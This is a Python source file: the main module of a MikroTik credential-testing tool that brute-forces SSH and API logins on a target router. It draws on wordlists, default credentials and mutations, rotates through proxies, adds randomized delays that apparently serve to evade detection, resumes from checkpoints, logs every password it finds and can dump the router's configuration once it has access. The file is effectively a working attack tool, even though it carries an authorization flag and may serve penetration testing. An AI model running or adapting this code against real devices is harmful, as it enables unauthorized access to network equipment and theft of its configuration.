"""Main orchestrator for MikroTik credential testing.

Usage:
    python -m mikrotik_tester --target 192.168.88.1 --use-defaults --i-am-authorized
"""

import logging
import random
import signal
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from threading import Event
from typing import Dict, List, Optional, Tuple

from .api_tester import ApiTester
from .checkpoint import CheckpointManager
from .cli import BANNER, parse_args
from .config import TestConfig
from .logger import AttemptLogger, setup_logging
from .proxy_manager import ProxyManager
from .reporter import Reporter
from .ssh_tester import SSHTester
from .wordlist import WordlistGenerator

logger = logging.getLogger("mikrotik_tester")

# Graceful shutdown event
shutdown_event = Event()


def _signal_handler(signum, frame):
    """Handle SIGINT/SIGTERM for graceful shutdown."""
    logger.info("Shutdown signal received, finishing current tasks...")
    shutdown_event.set()


def _test_single(
    index: int,
    username: str,
    password: str,
    protocol: str,
    config: TestConfig,
    ssh_tester: Optional[SSHTester],
    api_tester: Optional[ApiTester],
    proxy_manager: Optional[ProxyManager],
    checkpoint: CheckpointManager,
    reporter: Reporter,
    attempt_logger: AttemptLogger,
) -> List[Dict]:
    """Test a single credential pair against the specified protocol(s).

    Returns list of found credential dicts (0, 1, or 2 entries for 'both').
    """
    found = []

    protocols = (
        ["api", "ssh"] if protocol == "both"
        else [protocol]
    )

    for proto in protocols:
        if shutdown_event.is_set():
            break

        proxy = None
        proxy_sock = None
        proxy_display = ""

        # Set up proxy if available
        if proxy_manager:
            proxy = proxy_manager.get_next_proxy()
            if proxy:
                proxy_display = proxy.display
                try:
                    dest_port = (
                        config.api_port if proto == "api"
                        else config.ssh_port
                    )
                    proxy_sock = proxy_manager.create_socket(
                        proxy, config.target, dest_port, config.timeout
                    )
                except Exception as e:
                    logger.debug("Proxy %s failed: %s", proxy.display, e)
                    proxy_manager.mark_failure(proxy)
                    attempt_logger.log_attempt(
                        username, password, proto, False,
                        proxy=proxy_display, error=str(e),
                    )
                    reporter.record_attempt(False, error_type="proxy_error")
                    continue

        success = False
        error_type = ""
        method = ""

        try:
            if proto == "api" and api_tester:
                result = api_tester.test_credential(
                    username, password, sock=proxy_sock,
                )
                success = result.success
                error_type = result.error_type or ""
                method = "api"

            elif proto == "ssh" and ssh_tester:
                result = ssh_tester.test_credential(
                    username, password, sock=proxy_sock,
                )
                success = result.success
                error_type = result.error_type or ""
                method = result.auth_method or "ssh"

        except Exception as e:
            error_type = "exception"
            logger.debug("Unexpected error testing %s/%s via %s: %s",
                         username, proto, proxy_display or "direct", e)

        # Log attempt
        attempt_logger.log_attempt(
            username, password, proto, success,
            proxy=proxy_display, error=error_type,
        )

        # Record in reporter
        cred_dict = None
        if success:
            cred_dict = {
                "username": username,
                "password": password,
                "protocol": proto,
                "method": method,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }
            found.append(cred_dict)
            logger.info(
                "FOUND: %s:%s via %s (%s)",
                username, password, proto, method,
            )

        reporter.record_attempt(success, credential=cred_dict,
                                error_type=error_type)

        # Proxy health tracking
        if proxy:
            if success or error_type == "auth_failed":
                proxy_manager.mark_success(proxy)
            elif error_type in ("timeout", "connection_error",
                                "proxy_error"):
                proxy_manager.mark_failure(proxy)

    # Update checkpoint
    checkpoint.update(
        index,
        credential_found=found[0] if found else None,
    )

    return found


def main():
    """Main entry point."""
    print(BANNER)

    try:
        config = parse_args()
    except SystemExit:
        return
    except ValueError as e:
        print(f"Configuration error: {e}", file=sys.stderr)
        sys.exit(1)

    # Set up logging
    app_logger = setup_logging(config.log_file)
    attempt_logger = AttemptLogger(config.log_file)

    logger.info("Target: %s", config.target)
    logger.info("Protocol: %s", config.protocol)
    logger.info("Threads: %d", config.threads)
    if config.slow_mode:
        logger.info("Slow-down mode: enabled (2-5s random delays)")

    # Set up proxy manager
    proxy_manager = None
    if config.proxy_file:
        try:
            proxy_manager = ProxyManager(config.proxy_file)
            logger.info("Proxies loaded: %d active", proxy_manager.active_count)
        except (ValueError, FileNotFoundError) as e:
            logger.error("Proxy setup failed: %s", e)
            sys.exit(1)

    # Set up testers
    ssh_tester = None
    api_tester = None

    if config.protocol in ("ssh", "both"):
        ssh_tester = SSHTester(
            config.target, config.ssh_port, config.timeout,
            key_file=config.key_file,
        )

    if config.protocol in ("api", "both"):
        api_tester = ApiTester(
            config.target, config.api_port, config.timeout,
        )

    # Read router config if requested (via --read-config USER PASS)
    if api_tester:
        # Check for --read-config in sys.argv manually
        if "--read-config" in sys.argv:
            idx = sys.argv.index("--read-config")
            if idx + 2 < len(sys.argv):
                rc_user = sys.argv[idx + 1]
                rc_pass = sys.argv[idx + 2]
                logger.info("Reading router config with %s...", rc_user)
                router_config = api_tester.read_router_config(rc_user, rc_pass)
                if router_config:
                    logger.info("Router config:")
                    for section, data in router_config.items():
                        logger.info("  [%s]: %s", section, data)

    # Generate wordlist
    wordlist_gen = WordlistGenerator(
        usernames=config.usernames,
        wordlist_file=config.wordlist,
        use_defaults=config.use_defaults,
        mutate=config.mutate,
    )
    total_estimate = wordlist_gen.count_estimate()

    # Set up checkpoint and reporter
    checkpoint = CheckpointManager(config.checkpoint_file)
    reporter = Reporter(total_estimate)

    start_index = 0
    if config.resume:
        saved = checkpoint.load()
        if saved:
            start_index = saved.last_index + 1
            reporter.set_found(saved.found_credentials)
            logger.info("Resuming from index %d", start_index)
        else:
            logger.warning("No checkpoint found, starting fresh")

    checkpoint.set_metadata(
        start_time=datetime.now(timezone.utc).isoformat(),
        protocol=config.protocol,
        target=config.target,
    )

    # Register signal handlers
    signal.signal(signal.SIGINT, _signal_handler)
    signal.signal(signal.SIGTERM, _signal_handler)

    # Materialize credentials to support indexing for resume
    logger.info("Generating credential list...")
    credentials: List[Tuple[str, str]] = list(wordlist_gen.generate())
    total_estimate = len(credentials)
    reporter._total_estimate = total_estimate
    logger.info("Total credentials to test: %d (starting at %d)",
                total_estimate, start_index)

    if start_index >= len(credentials):
        logger.info("All credentials already tested")
        reporter.print_final_report()
        return

    # Main testing loop with thread pool
    found_all: List[Dict] = []

    try:
        with ThreadPoolExecutor(max_workers=config.threads) as executor:
            futures = {}

            for i in range(start_index, len(credentials)):
                if shutdown_event.is_set():
                    break

                username, password = credentials[i]

                # Slow-down mode: delay between submissions
                if config.slow_mode:
                    time.sleep(random.uniform(2.0, 5.0))

                future = executor.submit(
                    _test_single,
                    i, username, password, config.protocol, config,
                    ssh_tester, api_tester, proxy_manager,
                    checkpoint, reporter, attempt_logger,
                )
                futures[future] = i

                # Print progress every 10 attempts
                if (i - start_index) % 10 == 0 and i > start_index:
                    reporter.print_progress()

            # Collect results
            for future in as_completed(futures):
                try:
                    result = future.result(timeout=config.timeout * 2)
                    found_all.extend(result)
                except Exception as e:
                    logger.debug("Task error: %s", e)

    except KeyboardInterrupt:
        shutdown_event.set()
        logger.info("Interrupted by user")

    # Final checkpoint save
    checkpoint.save()

    # Print final report
    reporter.print_final_report()

    if found_all:
        sys.exit(0)
    else:
        sys.exit(1)


if __name__ == "__main__":
    main()
